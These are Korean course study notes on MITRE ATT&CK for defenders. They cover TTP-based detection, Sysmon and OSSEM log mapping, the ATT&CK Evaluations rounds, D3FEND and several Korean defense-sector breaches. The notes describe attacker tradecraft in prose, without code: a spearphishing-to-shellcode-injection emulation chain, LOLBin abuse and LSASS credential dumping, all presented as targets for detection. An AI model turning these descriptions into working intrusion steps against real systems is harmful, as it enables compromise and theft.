# [수업 노트] MITRE ATT&CK — TTP 기반 탐지, Evaluations, D3FEND, APT3 에뮬레이션 플랜·필드 매뉴얼

> 원본: 개인 학습 노트(Notion)에서 옮겨 정리. 스크린샷은 📷 표시로 화면 내용을 글로 옮겼습니다.

## 2026 실전형 사이버 훈련장[MITRE ATT&CK] -TTL 기반 탐지 전략

IoC 기반 탐지의 한계를 이해하고 TTP 기반 탐지 전략으로 패러다임 전환에 필요한 데이터 소스 유형과 표준화 방법론을 습득

- 주요 내용
  - IoC(파일 해시, IP, URL 등) 기반 탐지는 사후 대응적 특성, LOL Bin 활용 공격 우회, 운영 복잡도 증가 드의 문제로 현대 위협 대응에 한계가 있다. 그래서 행위기반의 TTL 탐자로의 패러다임 전환이 필요하다.
  - TTP 기반 탐지는 LSASS 접근 프로세스 확인, 주기적 네트워크 통신 감시 등 공격장의 행동 자체를 탐지 지표로 활용하여 ATT&CK 기법과 필요한 데이터 소스를 매핑하는 구조로 설계됨
  - 데이터 표준화를 위해 Sysmon 데이터 모델과 OSSEM(공통데이터 모델)활요하마녀 파편화된 이기종 로그 간의 관계를 정의하고 탐지 부석 효율을 극대화할 수 있다.

사이버 보안 패러다임의 변화

> 📷 강의 슬라이드(패러다임 변화): 불특정 다수의 위협을 한정된 자원으로 완벽히 차단하기는 불가능하다. 반면 공격자는 침투 직후 내부망 가시성이 없어 정보 수집과 내부 이동에 시간이 걸린다는 약점이 있다 → 차단 중심에서, 우회해 들어온 위협을 피해 전에 찾아내는 선제적 탐지(헌팅) 중심으로.

차단 중심의 사이버 보안의 한계와 선제적 대응으로 전략 이동

사이버 공간 상에 존재하는 불특정 다수에 의한 공격을 한정된 자원을 이용해서 완벽하게 방어하기는 어렵다.

선제적 탐지의 주요성이 부곽된다. 이는 공격자 그룹이 가지는 약점을 이용한 전략이기도 하다.

침투자는 침투직후 상대방 네트워크에 대한 가시성을 곧바로 가지지 못하고 내부망 침투과정에서 정보를 수집하고 정보를 수집하는 과정이 반드시 필요하다.  이떼 필요한 타임이 우리가 위협을 감지할 수 있는 기회가 된다.

> 📷 헌팅 유형(from IOC to TTP): 인텔리전스 기반(reactive, 확인된 IoC 활용), 가설 기반(proactive, 공격 전술을 가정하고 IoA를 검증), 베이스라인 기반(정상 상태를 정량화해 벗어난 편차 식별), 비정상 행위 기반(통계로 outlier를 찾아 미지의 위협 식별).

- Intelligence 기반
  - 다양한 IOC를 활용하는 방식
  - 이미 알려진 공격기법을 바탕으로 우리 내부에 흔적이 있는지 확인하는 가장 기본적인 방

> 📷 인텔리전스 기반 헌팅 예시 그림: IOC 피드(IP·해시·도메인 목록)와 일치하는 항목이 발견되면 'MATCH FOUND' → 해당 호스트 격리.

- 가설 기반
- 베이스라인 기반

> 📷 베이스라인 기반 헌팅 예시 그림: 시간에 따른 정상 활동량 곡선 위로 튀는 지점을 이상(Anomaly)으로 탐지.

#### IOC

- 공격자가 악성행위를 했을때 남기는 데이터 조각들
- 파일 내 해시 값

> 📷 IOC 기반 탐지의 한계: 사후 대응(이미 발생한 사고의 해시·IP 기반이라 제로데이 대응 불가), IOC 수 폭증으로 인한 연산 부하와 블랙리스트·오탐 관리 부담, LOLBin(certutil·powershell)과 서명된 바이너리 대리 실행 같은 우회 기법의 일반화, 그리고 룰이 많다는 사실만으로 안전하다고 착각하는 '거짓 안도감'.

> 📷 탐지 패러다임 비교: LSASS 크리덴셜 덤프는 IoC 방식이면 Mimikatz 해시로 탐지, TTP 방식이면 LSASS 메모리에 접근하는 프로세스·서명되지 않은 로드 DLL 확인. C&C 통신은 IoC 방식이면 IP·URL·FQDN·User-Agent, TTP 방식이면 주기적 통신, DNS 요청 프로세스, 최근 등록·무작위 생성 도메인과의 통신으로 탐지.

> 📷 Credential Dump(Mimikatz) 탐지 비교: IoC 기반은 파일 해시를 보므로 도구를 조금만 바꿔도 우회되고, TTP 기반은 LSASS 메모리 접근 행위를 보므로 도구와 무관하게 탐지된다.

> 📷 데이터 매핑 로직: 기법 → 데이터 소스 → 데이터 컴포넌트 → 로그 항목. 예: T1543 Create or Modify System Process의 .003 Windows Service는 Process(프로세스 생성 → Sysmon EID 1, 보안 감사 4688), Windows Registry(키·값 수정 → 4657, 키 생성 → Sysmon EID 12), Service(서비스 생성 → 4697, System 7045)로 이어진다.

> 📷 T1543 하위 기법: .001 Launch Agent, .002 Systemd Service, .003 Windows Service, .004 Launch Daemon.

> 📷 데이터 소스와 컴포넌트 대응: Process → Process Creation, Registry → Registry Key Modification, File → File Creation, Network Traffic → Network Connection.

> 📷 로그 이벤트 ID 매핑: 프로세스 생성은 Sysmon EID 1 / 보안 감사 4688, 서비스 설치는 Sysmon 없음 / 보안 감사 4697.

> 📷 Sysmon 데이터 모델: 프로세스를 중심으로 레지스트리 키(생성·수정·이름 변경·삭제), 파이프(생성·연결), 모듈(로드), IP·포트·호스트(연결), DNS(이름 질의), 파일(생성·수정), 파일 스트림(생성), 드라이브(raw access read), 다른 프로세스(종료·생성·접근·원격 스레드 생성)와의 관계를 기록한다.

> 📷 단순화한 그림: Process를 중심으로 Network Connection, Registry Event, File Creation, Process Access, DNS Query가 연결된다.

> 📷 OSSEM(Open Source Security Events Metadata): 여러 환경의 보안 로그를 공통 데이터 모델(CDM)로 표준화해 데이터 간 관계를 정의하고 탐지 분석을 효율화하는 커뮤니티 오픈소스 프로젝트. 데이터 사전(Data Dictionaries), 공통 데이터 모델, 탐지 모델(ATT&CK 매핑) 세 폴더로 구성.

- 공통 데이터 모델 CDM정의 및 공유
  - 보안 이벤트 로그 변환과 표준을 개선하기 위한 공통 스키마를 정의한다.


## 2026 실전형 사이버 훈련장[MITRE ATT&CK]1-TTPs 매트릭스 구조

차단 및 보호 중심의 방어 전략에서 탐지 중심으로서의 이동

- 차단 및 보호 매커니즘은 상당수가 reactive한 속성을 지닌다.
- 차단 및 보호 매커니즘을 우회하여 내부망에 침투하기 위한 다양한 공격 전략이 개발됨

##### 탐지의 중요성

- Lateral  Movement (레이털 무브먼트) 측면 이동

> 📷 공격 단계 그림: 초기 침투 → 교두보 확보 → 권한 상승 → 목적 행위 수행. 사내 IT 담당자 PC 등으로 들어온 뒤 HR 서버·클라우드 쪽으로 옮겨 가는 것이 레이털 무브먼트(측면 이동).

내부망에 침투한 이후 내부환경망 파악을 위한 정보 수집과 최종 목표 시스템에 도달하기 까지 시간이 소요된다.

공격자는 이를 위한 단계를 거치면서 흔적을 남기기 때문에 탐지의 기회가 생긴다.

MITRE ATT&CK는 이 지점을 중심으로 설계가 되었다.

공격자가 어떤 단계를 거쳐 목표를 향해 나아가는지 체계적으로 정리해 어느 지점에서 어떤 행동을 탐지할지 전략적으로 설계할지 알려준다.

#### DWELL TIME(잠복시간)

- 공격자가 내부망에 침투에 성공한 이 후 실제 발견되기까지 소요된 시간을 의미하며 잠복기라고 할 수있다.

> 📷 Mandiant M-Trends 2021 전 세계 평균 체류 시간(Dwell Time, 침투부터 발견까지 일수): 2011년 416일 → 2015년 146일 → 2020년 24일. 2020년 외부 통보로 발견하면 73일, 내부에서 스스로 발견하면 12일.

위 예시에서 보면  2011년에  수치 416은 공격자가 1년이상 활동을 하고 탐지를 다함을 의미. 그 만크 당시 공격에 취약함을 알 수있다.

2020년 24로 줄어들은 것은 단순히 빨리 탐지된다는 단순한 수치상의 의미를 넘어 탐지를 통한 보안이 효과가 있다는 것을 의미한다.

장기적인 보안정책의 방향성을 읽어내야한다.

#### 고통의 피라미드

> 📷 고통의 피라미드(David Bianco): 아래부터 해시값(Trivial, 코드 조금만 바꿔도 우회), IP 주소(Easy), 도메인(Simple), 네트워크/호스트 아티팩트(Annoying), 툴(Challenging, 상당한 코드 수정·개발 필요), 맨 위 TTP(Tough, 새 기법·절차를 고안해야 함). 위로 갈수록 공격자가 바꾸기 어렵다.

탐지로 인해 공격자에게 주는 임팩트까지 설명한 표

이 표가 의미하는 것은 탐지가 쉬운 지표만 의존하지 말고 새로운 테크닉이나 프로시저를 고안해야하는 지점을 노려야 공격을 실지적으로 방어 할 수 있다.

이 전략적 접근이 MITRE Framework와도 맞닿아있다.

#### IOC

시스템이 악이적인 활동에 의해 침해되었을 가능성이 높음을 보여주는 운영체제 또는 네트워크 아티팩트들을 통칭한다.

주요 예시로는 해시값, 파일 이름 및 경로. C2경로, IP어드레스, URI, 레지트리키. 서비스 이름/정보, 스케쥴된 테스크 정보 등으로 이 정보를 통해 침해 사실을 파악하고 특정 위혐이 공격이 발생하였는지 판단하기 위한 스그니처로 인식되고 활용됨

잠재적 위협을 탐지하기 위한 보편적 이상 행위를 포함하는 개념

##### IOC탐지의 구조적 한계점

  - 리액티브한 성실을 띤다. 이미 알려진 행위에 대응하는 방식으로 공격에 즉각적인 대응이 어렵다.
  - 공격자가 IOC를 조금만 바꿔도 우회할 수있기 때문에 IOC 중심이 방어는 지속적은 관리와 방어가 필요하다.  그리고 시간이 자남에 따라 효과가 급격하게 떨어지는 경향이 있다.
  - 대규모 환경에서 관리할 IOC가 많아서 탐지와 대응 속도가 늦어질 수 있다.
  - 그래서 IOC를 보완할 수 있는 TTPs( 행위기반 탐지)가 중요해지고 있다.

> 📷 IOC 기반 vs 행위 기반 탐지 표: LSASS 크리덴셜 탈취는 Mimikatz 해시(IOC) 대신 LSASS 메모리 접근·인젝션·서명 안 된 DLL 로드(TTP)로, HTTP C&C 통신은 IP·URL·User-Agent(IOC) 대신 주기적 아웃바운드·최근 등록·무작위 생성 도메인 통신(TTP)으로 탐지.

> 📷 TTPs 개요: Tactics(전술)=위협 행위의 목적, Techniques(기법)=목적 달성 수단, Procedures(절차)=기법의 구체적 구현. 예: 최초 접근 / 첨부파일 스피어 피싱 / 악성 고스트스크립트가 든 HWP를 메일로 보내고, 열면 mshta.exe가 2단계 스크립트를 받아 실행한 뒤 HTTP 비콘 악성코드를 내려받아 실행.

> 📷 MITRE ATT&CK(Adversarial Tactics, Techniques & Common Knowledge): 공개된 침해사고·악성코드 분석 보고서와 위협 그룹 정보에서 공격자 TTP를 모아 정리한 지식 베이스. 특히 침투 이후(post-exploitation) 행위를 분류하며, 탐지에 필요한 데이터 소스·컴포넌트·완화책·위협 그룹·소프트웨어 정보를 담는다. 다만 중요도나 관찰 빈도는 반영하지 않고 사각지대도 있어 계속 업데이트된다.

> 📷 ATT&CK 매트릭스: 열은 전술, 행은 그 전술에 쓰이는 기법·하위 기법. Reconnaissance부터 Impact까지 14개 전술(예: Lateral Movement 열에 Exploitation of Remote Services, Internal Spearphishing, Remote Services 등).

실제 공격 사례를 기반을 만들어짐

> 📷 매트릭스 종류: Enterprise(윈도우·맥·리눅스·클라우드·네트워크·컨테이너), Mobile(안드로이드·iOS), ICS(산업제어시스템). 기법 페이지 예 T1110 Brute Force: 하위 기법 .001 Password Guessing, .002 Password Cracking, .003 Password Spraying, .004 Credential Stuffing, 전술 Credential Access, 플랫폼·버전·수정일 정보와 설명.

> 📷 기법 페이지의 Procedure Examples(APT3, Dragonfly, FIN6, Salt Typhoon 등이 실제로 쓴 사례)와 Mitigations(M1036 계정 잠금 정책, M1032 다중 인증, M1027 비밀번호 정책, M1018 유출 계정 선제 초기화). 설명은 개괄적이라 구체적인 적용은 추가로 찾아봐야 한다.

- Procedure Examples 에는 실제 공격사례
- Mitgration 각 공격에 대응할 수 있는 보안 설정, 정책 변경, 다중 인증 적용 등 실질적인 보안 정책을 정리해둠
- 실질적으로 적용 가능한 정책 변경 대응 전략

> 📷 기법 페이지의 Detection 표: 데이터 소스(살펴볼 데이터, 예: Command·File), 데이터 컴포넌트(그 안의 세부 항목, 예: Command Execution·File Metadata·File Modification), 탐지 방안(예: setuid/setgid 비트를 설정하는 chmod 실행 감시).

> 📷 14개 전술 설명 표: 정찰(공격 계획용 정보 수집), 리소스 개발(인프라·악성코드 준비), 초기 접근(거점 확보), 실행(악성 코드 실행), 지속성(재시작·자격증명 변경 후에도 접근 유지), 권한 상승, 방어 우회, 크리덴셜 접근(계정·비밀번호 탈취), 디스커버리(내부 환경 관찰), 레이털 무브먼트(다른 시스템으로 확장), 수집, C2(장악 시스템과 통신·제어), 유출(외부 반출), 임팩트(조작·방해·파괴).

Tractics : 전술자가 수행하는 각단계의 목표를 나타냄 14지 전술이 단계별로 정리가 잘되어있다.

> 📷 사이버 킬 체인(Lockheed Martin): 실제 공격 관찰을 바탕으로 공격 단계를 모델화한 것. 단계별 구체 기법은 다루지 않고, 단계마다 대응 전략을 세워 위협을 제거·완화하는 데 쓴다.

사이버 킬체인은 구프레임워크 - 공격의 흐름을 분석하는 것

> 📷 MITRE ATT&CK은 절차보다 공격자 TTP를 집대성하는 데 초점을 두고, 각 TTP에 대한 현재 탐지·대응 수준(AS-IS)을 분석해 TO-BE 전략을 세우는 데 쓴다.

Mitre ATT&CK 는 그 공격 속에 담겨진 행위를 분석해 실질적인 탐지와 대응책을 분석하는 도구

> 📷 킬 체인 7단계 그림: Recon → Weaponization → Delivery → Exploitation → Installation → Command & Control → Actions on Objectives. (앞 두 슬라이드의 킬 체인·ATT&CK 비교 내용을 한 장에 정리)

> 📷 강의 요약: ATT&CK은 실제 공격자의 전술·기법으로 위협 행위를 체계화해 조직의 보안 수준을 진단하고 탐지·대응 역량을 강화하는 분석 도구이며 매트릭스로 시각화된다. 킬 체인은 공격 흐름을 단계로 설명하는 공격 관점 모델. ATT&CK은 분석을 넘어 탐지 콘텐츠 개발과 보안 전략 수립의 핵심 프레임워크로 쓰인다.

> 📷 ATT&CK 활용 순환: 방어 커버리지 평가(ATT&CK 기반 공격 에뮬레이션, Atomic Red Team, SOC 평가, ATT&CK Evaluations) → 우선순위 공백 식별(ATT&CK Heatmap) → 방어 조정·도입(ATT&CK Evaluations, Cyber Analytics Repository). SOC·보안 솔루션의 현황을 AS-IS로 평가하고 탐지 애널리틱스를 개발하는 데 쓴다.

> 📷 Threat Informed Defense 5단계: ① ATT&CK·위협 인텔·IOC·IOB 등을 입력으로 공격자 TTP·도구 식별 ② 공격 에뮬레이션 계획 수립 ③ 공격 모사 ④ 탐지·헌팅·보고 ⑤ 부족한 프로세스·기술 보완(이후 침해 대응·복구와 연결되며 순환).

> 📷 Atomic Red Team: ATT&CK 기법을 하나씩 독립적으로(atomic) 실행해 볼 수 있게 구현한 테스트 라이브러리. 의존성이 적어 방어 체계를 바로 시험할 수 있지만, 제공되는 절차의 다양성·완전성은 완벽하지 않다.

#### Adversary Emultion은 MITRE ATT&CK 에서 언급한 기술을 현실적으로 재현할수 있게만들어 놓은 Opensource도구모음

특정 Tpp가 시스템 내에서 어떻게 돌아가는지 테스트하고 조직의 방어체계가 해당행위를 탐지할 수있는지를 손쉽게 확인할 수있다.  다만 혀재 제공되는 시뮬레이션이 모든 상황에서 동일하게 돌아가는 것은 아니다.  보다 정밀한 환경설정과 조건 설정이 필요할 수 있다.

> 📷 Adversary Emulation Plan 작성: 대상 위협 그룹의 TTP 분석 → 단계별 TTP 선택 → 킬 체인 등으로 배치해 공격 흐름 구성 → 절차 설계·구현. 같은 기법도 도구·명령이 매우 다양하므로 특정 도구보다 행위 자체에 집중해야 한다. 예시 흐름도: 초기 침투 → 방어 우회(파일 삭제, Rundll32 등) / 디스커버리 / 권한 상승 → 크리덴셜 접근(Invoke-Mimikatz, 키로깅) → 지속성(시작 폴더, 신규 서비스, 예약 작업) → 측면 이동(net use+SMB, RDP) → 실행(CLI, psexec) → 유출(WinRAR 압축, 443 암호화 통신).

> 📷 에뮬레이션 계획 예(Initial Access, Host A): 스피어피싱 메일(T1566.001)의 Word 문서가 DDEAUTO(T1559.002)로 mshta.exe(T1218.005)를 실행해 C2에서 security-update.hta를 받음 → 난독화된 HTA(T1027)가 숨김 Excel을 띄우고 매크로(T1059.005)가 rundll32.exe에 셸코드 주입(T1055, CreateRemoteThread/WriteProcessMemory) → 셸코드가 HTTP로 비콘 DLL을 받아 메모리에만 저장(T1105) → reflective DLL 인젝션(T1055.001) → 시스템 정보를 HTTPS로 C2에 전송(T1071.001, T1032).

정량적 분과 시뮬레이션을 위한 로드맵

> 📷 ATT&CK Evaluations: MITRE가 EDR 등 TTP 기반 탐지 솔루션을 대상으로 공격을 에뮬레이션해 무엇을 얼마나 정확히, 어떻게 탐지하는지 직접 평가. 구매자에게는 의사 결정 근거를, 개발사에게는 커버리지 검증을 제공한다.

실질적 평가 도구

> 📷 Evaluation Round 1: 2010년부터 서방 정부·군을 노린 APT3(중국 국가안전부 연관 추정)를 에뮬레이션. 10개 전술, 136개 절차, 56개 기법을 테스트. 3단계(초기 접근 → 내부 확산 → 수집·유출) 방법으로, 특정 도구·IOC보다 행위 탐지 능력에 초점(Cobalt Strike·Empire로 같은 행위를 여러 방식으로 구현). 네트워크는 Windows 10 PC 3대, 도메인 컨트롤러·파일 서버, 팀 서버·리다이렉터·VPN.

> 📷 Round 1 결과 정리: 점수보다 '어떻게 탐지했는지'를 설명하는 데 초점. 주 탐지 유형은 None, Telemetry(가공 없는 데이터만), IoC, Enrichment(ATT&CK 전술·기법 태그 등 부가 정보), General Behavior(전술 수준 설명), Specific Behavior(기법 수준 설명)이고, 보조 유형으로 Delayed(지연 탐지), Tainted(앞선 의심 탐지에 기반), Configuration Change(설정 변경 후 탐지)가 있다. 참여 기업은 Carbon Black, CrowdStrike, Microsoft, SentinelOne, Cybereason, FireEye, Palo Alto 등 12개사(대부분 EDR).

단순한 기업 비교가 아님

> 📷 MITRE Top ATT&CK Techniques — 최근 3년간 랜섬웨어 그룹 22개를 분석한 랜섬웨어 Top 10: T1486 데이터 암호화, T1490 시스템 복구 방해, T1027 난독화, T1047 WMI, T1036 위장, T1059 명령·스크립트 인터프리터, T1562 방어 무력화, T1112 레지스트리 수정, T1204 사용자 실행, T1055 프로세스 인젝션.

기술 리스트로 의미가 크다

어떤 기술이 반복적으로 등장하는지 분석하고 기업이 대비할 수 있게 도와준다.

> 📷 Logpoint Top 10: ①T1059 명령·스크립트 인터프리터(사고의 38%, PowerShell 20%) ②T1003 OS 크리덴셜 덤프(34.5%, LSASS 메모리 25.5%) ③T1090 프록시 ④T1055 프로세스 인젝션 ⑤T1036 위장 ⑥T1078 유효 계정 ⑦T1190 공개 애플리케이션 익스플로잇 ⑧T1112 레지스트리 수정 ⑨T1053 예약 작업 ⑩T1562 방어 무력화.

> 📷 Red Canary Threat Detection Report Top 10: T1059.003 Windows Command Shell, T1059.001 PowerShell, T1047 WMI, T1027 난독화, T1218.011 Rundll32, T1105 Ingress Tool Transfer, T1055 프로세스 인젝션, T1569.002 서비스 실행, T1036.003 시스템 유틸리티 이름 변경, T1003.001 LSASS Memory.

> 📷 Picus Top 10: T1059(31%), T1003(25%), T1486, T1055, T1082 시스템 정보 탐색, T1021 원격 서비스(신규), T1047 WMI(신규), T1053, T1497 가상화·샌드박스 회피, T1018 원격 시스템 탐색. 여러 보고서에서 공격자가 선호하는 기법이 반복해 나타난다.

탐지가 어려운 기술들..

공격자들은 선호하는 기술을 반복적으로 사용함

> 📷 강의 요약: ATT&CK은 위협을 행위 단위로 분해해 보안 솔루션의 탐지 범위를 체계적으로 평가하는 지식 기반이고, Evaluations는 실제 APT 시나리오로 EDR 탐지 결과를 정량화한다. 이를 근거로 탐지 규칙 튜닝, 헌팅 체계, 실전형 훈련 설계를 고도화할 수 있다.

#### MITRE ATT&CK Evaluation 사례 분석

> 📷 Evaluation 라운드 종류: Detection(공격 행위를 얼마나 보는가 — 기법별 탐지 카테고리 None~Technique, 평가 직전 설정 변경은 횟수·내용이 공개됨), Protection(얼마나 막는가 — Round3(2021, Carbanak+FIN7)부터, 단계별 Blocked/Quarantined/Interrupted), MSSP(탐지 후 분석·대응이 적절했는가 — 알림 품질, MTTD, 보고서 완성도). 알림이 공격을 어떤 맥락으로 설명하느냐에 따라 카테고리가 달라진다.

> 📷 Telemetry vs Analytic: Telemetry는 로그만 수집하고 판단은 분석가가 수동으로 해야 해 대규모 환경에선 현실적으로 분석 불가. Analytic은 제품이 스스로 분석해 알림을 만든다. 계층: None(공백) → Telemetry(수집만) → General(의심 활동, 기법 미식별) → Tactic(목적 Why 식별) → Technique(기법 How 정확히 식별, 가장 가치 있음).

> 📷 Round 1 – APT3(중국 국가안전부 연계 추정, 미국 방산·항공우주·통신 대상, Flash 제로데이 활용): 초기 침투 → 내부 정찰 → 자격증명 탈취 → 측면 이동 시나리오, 주요 기법 T1059·T1003·T1021·T1078. 8개 벤더 대부분이 Telemetry 수집은 됐지만 Technique 수준 탐지는 낮았고 특히 자격증명 덤프·측면 이동에서 공백이 컸다 → 'EDR을 샀으니 안전하다'는 착각을 깨고 메모리 기반·행동 분석 투자 계기가 됨.

> 📷 Round 2 – APT29/Cozy Bear(러시아 대외정보국 산하, 2020년 SolarWinds 공급망 침해 배후, 18,000여 기관에 악성 업데이트, 100여 곳 심층 침투): 시나리오1은 초기 침투·정찰·지속성·자격증명 탈취, 시나리오2는 측면 이동·수집·유출. 둘 다 파일리스와 정상 도구 악용 위주. T1003.001·T1550이 서명 기반 탐지를 우회했고 상당수 벤더가 Telemetry에 그쳤다. 메모리 스캔과 행동 탐지 엔진 품질이 성패를 갈랐고 AI/ML 탐지 경쟁을 가속.

> 📷 Round 3 – Carbanak+FIN7(전 세계 100여 금융기관에서 10억 달러 이상 피해, 수개월 잠복 후 SWIFT·ATM 조작 / FIN7은 소매·요식업 POS 공격): Protection 라운드 최초 도입 — 탐지가 뛰어나도 사람이 대응하기 전에 공격이 끝나면 소용없다는 문제의식. 결과적으로 Detection 상위 제품이 Protection에서도 상위는 아니었다(EDR은 가시성 위해 자동 차단을 제한, EPP는 차단은 강하나 맥락 부족). 분석 인력이 충분하면 Detection 위주, 부족하면 자동 차단이 강한 Protection 위주 제품이 실용적.

> 📷 Round 4 – Wizard Spider(TrickBot 기반 Ryuk·Conti 랜섬웨어, 병원·기관 상대로 수천만 달러 요구) + Sandworm(러시아 GRU 산하, 2015~16 우크라이나 전력망 공격, 2017 NotPetya): 피싱 → TrickBot 거점 → 내부 확산 → Ryuk 유포, 그리고 IT망에서 OT망으로 피벗해 ICS에 물리적 영향. 이 라운드와 함께 MSSP 평가 프로그램이 시작돼 보안 운영 아웃소싱 가능 여부를 판단할 근거를 제공.

> 📷 Round 5 – Turla(Venomous Bear·Snake, 러시아 FSB 연계, 1990년대 후반부터 유럽 정부·군·대사관 대상): 자체 악성코드 Snake가 10년 넘게 탐지되지 않았고 DNS 터널링을 C2로 써 네트워크 감시를 무력화. 에뮬레이션된 LoL 기법: PowerShell(T1059.001, 인메모리 실행), WMI(T1047, 원격 실행·지속성), certutil(T1140, 파일 다운로드·디코딩), regsvr32(T1218.010, 화이트리스트 우회).

> 📷 5개 라운드 트렌드: 전체 탐지율은 해마다 상승, 공격 복잡도도 계속 고도화, CrowdStrike·SentinelOne·Microsoft 등 상위 벤더는 일관된 성능, LoL·메모리 기반 공격·OT 환경 기법은 5개 라운드 내내 공통 공백, 설정 변경 없이도 높은 성능을 내는 제품이 늘어 기본 탐지 능력이 향상.

> 📷 평가 결과를 활용한 Gap 분석 3단계: ① 운영 중인 솔루션의 평가 결과(설정 변경 없는 기본값 기준)를 ATT&CK Navigator 레이어로 작성 ② 업종·위협 모델에 맞는 대상 그룹(Wizard Spider, Lazarus 등)의 기법 레이어 생성 ③ 두 레이어를 겹쳐 '그룹은 쓰지만 우리는 못 잡는' Detection Gap을 시각화하고 비용·효과로 우선순위를 정해 해결. 룰 개선(Sigma): 누락 기법 추출 → SigmaHQ에서 룰 검색 → Atomic Red Team으로 재현·검증 → 오탐률 확인 후 SIEM 배포·정기 갱신.

> 📷 퍼플팀: 공격·방어가 협력해 탐지 실패 시 바로 개선책을 논의하는 선순환 구조. CALDERA는 복합 공격 체인 자동 재현, Atomic Red Team은 기법별 개별 테스트에 적합. 경영진 보고는 'Technique 탐지율 65%' 대신 '랜섬웨어 핵심 행위 20개 중 7개를 못 잡아 복구 불가능한 데이터 손실 위험'처럼 위험 중심으로, 현황·위험·해결책과 효과 구조로 작성.

> 📷 자체 모의 평가(Mini Evaluation): 조직에 치명적인 핵심 기법 10~20개만 골라 탐지력을 검증. 5단계 — 기법 선정(최신 위협 인텔 반영) → 운영과 같은 설정의 격리 테스트 베드 구성 → CALDERA 등으로 에뮬레이션·기록 → MITRE 카테고리(None~Technique)로 분류 → 실패 항목 개선 후 재검증해 정량적 추이 관리.

> 📷 강의 요약: ATT&CK Evaluations는 실제 APT 침해 체인 전체를 에뮬레이션해 가시성을 측정하고 Round 3부터 차단 라운드를 더했다. 탐지와 차단 성능은 다를 수 있어 SOC 성숙도에 맞는 제품을 골라야 한다. APT3 → APT29 → Carbanak+FIN7 → Wizard Spider+Sandworm → Turla로 고도화됐고 상위 벤더는 메모리 스캔·행동 탐지에 강했다. Round 4부터 MSSP 평가도 도입.

#### MITRE D3FEND 프레임워크 개요

> 📷 MITRE D3FEND: ATT&CK 공격 기법에 대응하는 방어 기법을 정리한 지식 그래프로 "이 공격을 막으려면 어떤 방어 기술을 써야 하나"에 답한다. 2001~2019년 미국 특허·연구 문헌과 CAR(Cyber Analytics Repository)를 분석해, 무엇을 어떻게(How) 탐지·차단하는지와 한계를 정리. 미국 국가안보국 지원으로 2021년 6월 발표, 공격 기법과 방어 기법 간 관계를 정의.

> 📷 D3FEND 7개 방어 전술: Model(자원·연결·행위를 구조화해 정상 기준선 수립), Harden(공격 표면 축소), Detect(악의적 활동 식별), Isolate(침해 시스템 분리), Deceive(공격자 유인·정보 수집), Evict(공격자 제거·재침입 방지), Restore(원래 상태로 복구). 매트릭스 상단이 방어 전술, 그 아래가 베이스 기법.

> 📷 Model 전술 항목: 자산·관계 매핑(모든 H/W·S/W 식별, 연결 관계 도식화), 네트워크 토폴로지 모델링(허가된 경로 외 통신 식별 기준), 프로세스 계층 분석(정상 부모-자식 관계 모델링으로 이상 실행 탐지), 사용자 행위 프로파일링(계정별 평소 접근 시간·위치·명령 패턴).

> 📷 Harden(운영 전에 선제적으로 공격 비용을 높임): 불필요 포트·데몬 비활성화, 최신 패치, MFA·최소 권한·계정 추적, 보안 가이드라인에 따른 구성 강화. Detect: 행위 기반 실시간 분석, 로그 수집·분석으로 침해 흔적 탐지, 위협 인텔리전스로 IoC 탐지 강화, SIEM·EDR·XDR 연동으로 통합 분석.

> 📷 Isolate(논리·물리적 장벽): 네트워크 세분화로 측면 이동 방지, 의심 세션 자동 종료, NAC로 비인가 단말 격리·VLAN 분리, EDR/XDR 자동 격리. Deceive: 허니팟(가짜 서버), 허니토큰(가짜 계정·미끼 파일·위장 DB), 가짜 자격 증명 삽입으로 도용 시 즉시 탐지.

> 📷 Evict: C2 통신 차단, 백업·자동 롤백으로 악성코드 제거, 로그·휘발성 데이터 등 포렌식 증거 확보, IoC 기반 후속 차단 규칙 추가. Restore: 스냅숏·오프사이트 백업으로 무결성 검증된 시점 복원, 변조된 MBR/VBR 재작성, 공격자가 만든 레지스트리·환경 변수·스케줄러 항목 삭제 후 골든 이미지 설정으로 초기화, 임의로 열린 포트·방화벽 룰 재설정.

> 📷 D3FEND 핵심 지식 모델: 방어 전술·기법을 계층 표로 보여 주며 내부적으로는 방향성 비순환 그래프(DAG). 가장 큰 특징은 공격 기법(ATT&CK)과 방어 기법(D3FEND)을 직접 잇지 않고 그 사이에 Digital Artifact를 매개로 둔다는 점 — 공격 기법이 아티팩트를 만들고(Produce), 방어 기법이 그 아티팩트를 관찰(Observe)한다.

> 📷 아티팩트 온톨로지를 통한 추론 예: ATT&CK의 Process Injection, Exploitation for Client Execution/Privilege Escalation/Remote Services는 모두 ProcessCodeSegment를 수정(modifies)하고, D3FEND의 Process Code Segment Verification이 그 아티팩트를 검증(verifies)하므로 이 방어 기법이 네 공격 기법에 대응한다고 연결된다.

> 📷 Artifact Ontology: 디지털 객체가 공격자·방어자와 상호작용할 때 남는 흔적을 Digital Artifact로 정의하고 High-Level Artifacts(인증·메모리 등), Files, Network Traffic, Software 4개 계층으로 분류. 특정 솔루션에 종속되지 않는 추상 구조라 추론적 분석이 가능하며, 인프라에 실제 존재하는 아티팩트만 다룬다.

> 📷 아티팩트 페이지 예(Process Code Segment): 관련 대응 기법(Harden·Detect — analyze, block, filter, verify 등의 관계)과 관련 공격 기법(ATT&CK — modify, may-modify, add, produce, load, create, execute 등의 관계)이 한 화면에 연결돼 표시된다.

> 📷 침해 사례 1 – 라자루스: 2022년 11월 망 분리된 방산업체의 외부망 서버를 악성코드로 감염시킨 뒤, 관리 소홀로 '테스트 목적'으로 열려 있던 망 연계 시스템 포트를 악용해 내부망 개발 웹서버로 침투. 직원 PC 등을 장악해 자료를 수집하고 외부망 서버를 거쳐 해외 클라우드로 유출.

> 📷 침해 사례 2 – 안다리엘: 방산 협력업체에 원격 유지보수를 제공하는 IT 업체를 발판으로 삼음. 2022년 10월 유지보수 업체 직원의 개인 이메일 계정을 탈취하고, 회사 계정과 같은 비밀번호를 쓰는 점을 악용해 원격 유지보수 솔루션으로 협력업체 서버에 접속, Nukespeed·Tiger RAT를 설치해 방산 기술 자료를 유출.

> 📷 침해 사례 3 – 김수키: 2023년 4~7월 방산 협력업체가 쓰는 그룹웨어 메일 서버의 제로데이/미패치 취약점을 악용. 외부에서 인증 없이 메일 대용량 첨부파일(100MB 이상, 그룹웨어 서버에 보관)을 내려받을 수 있는 취약점이라 기술 자료를 쉽게 탈취.

